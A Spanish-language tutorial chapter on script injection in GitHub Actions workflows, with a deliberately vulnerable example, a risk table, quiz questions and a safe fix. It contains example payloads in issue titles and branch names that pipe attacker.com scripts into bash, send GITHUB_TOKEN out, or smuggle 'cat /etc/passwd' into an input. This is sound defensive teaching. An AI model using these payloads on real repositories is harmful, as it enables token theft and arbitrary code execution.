# 5.2.1 Script Injection — Vectores y Anatomía del Ataque

← [5.1 Environment Protections](gha-environment-protections-security.md) | [Índice](README.md) | [5.2.2 Script Injection — Mitigación](gha-script-injection-mitigacion.md) →

---

**Script injection** en GitHub Actions es una vulnerabilidad que ocurre cuando un valor proveniente de un evento externo se interpola directamente en un step `run:` como expresión `${{ }}`. Bash recibe el valor expandido antes de ejecutarlo, lo que permite a un atacante insertar comandos shell arbitrarios controlando, por ejemplo, el título de un issue o el nombre de una rama. No es un bug de GitHub: es una consecuencia directa de mezclar interpolación de templates con ejecución de shell.

> [ADVERTENCIA] Script injection en este fichero cubre los vectores de ataque. La mitigación está en [gha-script-injection-mitigacion.md](gha-script-injection-mitigacion.md).

## Por qué la interpolación directa en run: es peligrosa

Cuando GitHub Actions procesa un workflow, las expresiones `${{ }}` se resuelven **antes** de que el runner ejecute el shell. El runner recibe un script con el valor ya incrustado en el texto. Si ese valor contiene metacaracteres de shell (`$()`, `` ` ``, `;`, `&&`, `|`), bash los interpreta como comandos, no como datos.

El flujo de evaluación es el siguiente: GitHub expande `${{ github.event.issue.title }}` → el resultado se escribe literalmente en el script → bash ejecuta el script con ese texto ya en él. No hay ninguna capa de sanitización entre la expresión y el shell.

> [CONCEPTO] La expresión `${{ }}` es una sustitución de texto en tiempo de compilación del workflow, no un paso en tiempo de ejecución de bash. Por eso no existe "escaping automático" para valores que van dentro de `run:`.

## Contextos no confiables

Un contexto es **no confiable** cuando su valor puede ser controlado por cualquier usuario externo, no solo por el propietario del repositorio. Los principales contextos no confiables son:

- `github.event.issue.title` y `github.event.issue.body`
- `github.event.pull_request.title`, `github.event.pull_request.body` y `github.event.pull_request.head.ref`
- `github.head_ref` (alias de `pull_request.head.ref`)
- `github.event.comment.body`
- `github.event.inputs.*` cuando no hay validación de formato
- `github.event.review.body`

En contraste, `github.sha`, `github.ref` (en push a ramas protegidas) y `github.actor` sobre repositorios privados tienen un nivel de confianza mayor, aunque no absoluto.

> [EXAMEN] `github.head_ref` es especialmente peligroso porque es el nombre de la rama del fork, que el atacante controla completamente y puede llamar `main; curl attacker.com/evil.sh | bash`.

## Eventos de alto riesgo

No todos los eventos tienen el mismo nivel de riesgo. El trigger `pull_request` ejecuta el workflow con permisos de solo lectura y en el contexto del fork (sin acceso a secrets del repositorio base). Sin embargo, otros triggers elevan el riesgo significativamente.

`pull_request_target` fue diseñado para acceder a secrets del repositorio base desde PRs de forks. Se ejecuta en el contexto del repositorio base con permisos de escritura. Si ese workflow hace checkout del código del PR y luego lo ejecuta, el código del atacante corre con acceso completo a los secrets.

`issue_comment` se dispara cuando cualquier usuario comenta en un issue o PR. El comentario (no confiable) puede contener la inyección y el workflow puede tener permisos elevados si se configuró sin restricciones.

> [ADVERTENCIA] La combinación `pull_request_target` + `actions/checkout` del código del PR + uso de contextos no confiables en `run:` es la vulnerabilidad más explotada en workflows de repositorios públicos.

## Ejemplo central

El siguiente workflow muestra dos versiones: la versión vulnerable y la razón por la que es peligrosa. El atacante crea un issue con un título que contiene un comando shell.

```yaml
# VULNERBLE — NO usar en producción
name: Issue Labeler (VULNERABLE)

on:
  issues:
    types: [opened]

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - name: Mostrar título del issue
        # PELIGRO: si el título es '$(curl attacker.com/evil.sh | bash)'
        # bash ejecutará ese comando con los permisos del runner
        run: |
          echo "Issue recibido: ${{ github.event.issue.title }}"

      - name: Usar branch name (también vulnerable)
        # PELIGRO: el nombre de la rama lo controla quien abre el PR
        run: |
          echo "Branch: ${{ github.head_ref }}"
          git checkout ${{ github.head_ref }}

# Título de issue malicioso que explota la vulnerabilidad:
# Título: "test$(curl -s https://attacker.com/steal.sh?token=$GITHUB_TOKEN | bash)"
#
# Lo que bash recibe después de la expansión:
# echo "Issue recibido: test$(curl -s https://attacker.com/steal.sh?token=$GITHUB_TOKEN | bash)"
#
# Resultado: bash ejecuta el subshell y envía GITHUB_TOKEN al servidor del atacante
```

> [EXAMEN] En el ejemplo anterior, el `GITHUB_TOKEN` tiene permiso `issues: write` declarado en el workflow. Aunque el token tiene scope limitado, el atacante podría crear o modificar issues usando ese token. Si los permisos fueran más amplios, el impacto sería mayor.

## Tabla de vectores y nivel de riesgo

Los siguientes vectores están ordenados de mayor a menor frecuencia en vulnerabilidades reportadas en repositorios públicos:

| Vector | Evento origen | Controlado por | Nivel de riesgo |
|---|---|---|---|
| `github.event.issue.title` | `issues` | Cualquier usuario | Alto |
| `github.event.pull_request.body` | `pull_request_target` | Fork owner | Crítico |
| `github.head_ref` | `pull_request_target` | Fork owner | Crítico |
| `github.event.comment.body` | `issue_comment` | Cualquier usuario | Alto |
| `github.event.inputs.*` | `workflow_dispatch` | Usuario con permisos | Medio |
| `github.event.review.body` | `pull_request_review` | Reviewer | Medio |
| `github.event.pull_request.title` | `pull_request` | Fork owner | Bajo* |

*`pull_request` sin `_target` corre sin secrets del repo base, lo que limita el impacto pero no elimina el riesgo de exfiltrar datos del runner o el GITHUB_TOKEN de solo lectura.

## Buenas y malas prácticas

**Hacer:**
- Tratar cualquier valor de evento externo como no confiable por defecto — razón: el modelo mental "inocente hasta demostrar lo contrario" lleva a introducir vulnerabilidades al agregar nuevos campos de eventos.
- Revisar todos los steps `run:` que contengan `${{ github.event.` — razón: esos son los puntos de inyección más directos y fáciles de detectar en una auditoría manual.
- Preferir `pull_request` sobre `pull_request_target` cuando no se necesitan secrets del repo base — razón: `pull_request` ejecuta en contexto del fork sin acceso a secrets, lo que contiene el daño potencial.

**Evitar:**
- Usar `${{ github.event.* }}` directamente en cualquier campo de `run:` — razón: no existe escaping automático y el valor se incrusta como texto plano en el script de bash.
- Hacer checkout del código del PR dentro de un workflow `pull_request_target` que use contextos no confiables — razón: esta combinación ejecuta código del atacante con permisos del repositorio base.
- Confiar en que el valor "parece inofensivo" durante la revisión — razón: los atacantes pueden crear issues o PRs en cualquier momento después del merge del workflow.

## Verificación y práctica

**Pregunta 1.** ¿Por qué `${{ github.event.issue.title }}` en un step `run:` es peligroso pero `${{ github.sha }}` no lo es?

**Respuesta:** `github.event.issue.title` es controlado por cualquier usuario externo que cree un issue; puede contener metacaracteres de shell. `github.sha` es calculado por GitHub a partir del contenido del commit y no puede ser manipulado directamente por un atacante externo. Además, la interpolación `${{ }}` ocurre antes de que bash ejecute el script, por lo que no hay sanitización.

**Pregunta 2.** Un workflow usa `pull_request_target` y hace `actions/checkout@v4` con `ref: ${{ github.event.pull_request.head.sha }}`. ¿Cuál es el riesgo específico?

**Respuesta:** `pull_request_target` corre en el contexto del repositorio base con acceso a sus secrets. Al hacer checkout del SHA del PR del fork, se ejecuta código arbitrario del atacante en ese contexto privilegiado. El atacante puede exfiltrar todos los secrets del repositorio base a través de ese código.

**Pregunta 3.** ¿Qué evento tiene mayor riesgo: `issues: [opened]` o `issue_comment: [created]`? ¿Por qué?

**Respuesta:** `issue_comment` tiene mayor riesgo en la práctica porque cualquier usuario puede comentar en issues y PRs existentes, incluso en repositorios con pocas restricciones. Además, los comentarios en PRs de forks pueden disparar `issue_comment` que corre en el contexto del repositorio base (a diferencia de `pull_request`).

**Ejercicio práctico.** Identifica los dos vectores de inyección en el siguiente workflow:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: "Target environment"

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          ./deploy.sh ${{ github.event.inputs.environment }}
          echo "Deployed by ${{ github.actor }}"
```

**Solución:**

```yaml
# Vector 1: github.event.inputs.environment
# El usuario puede pasar "prod; cat /etc/passwd" como valor del input
# bash recibe: ./deploy.sh prod; cat /etc/passwd

# Vector 2: github.actor
# En repositorios que permiten forks y tienen workflow_dispatch accesible
# a contribuidores, el actor puede tener un nombre con metacaracteres.
# Aunque el riesgo es menor, sigue siendo una interpolación directa.

# Forma segura:
on:
  workflow_dispatch:
    inputs:
      environment:
        description: "Target environment"

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        env:
          TARGET_ENV: ${{ github.event.inputs.environment }}
          ACTOR: ${{ github.actor }}
        run: |
          ./deploy.sh "$TARGET_ENV"
          echo "Deployed by $ACTOR"
```

---
← [5.1 Environment Protections](gha-environment-protections-security.md) | [Índice](README.md) | [5.2.2 Script Injection — Mitigación](gha-script-injection-mitigacion.md) →
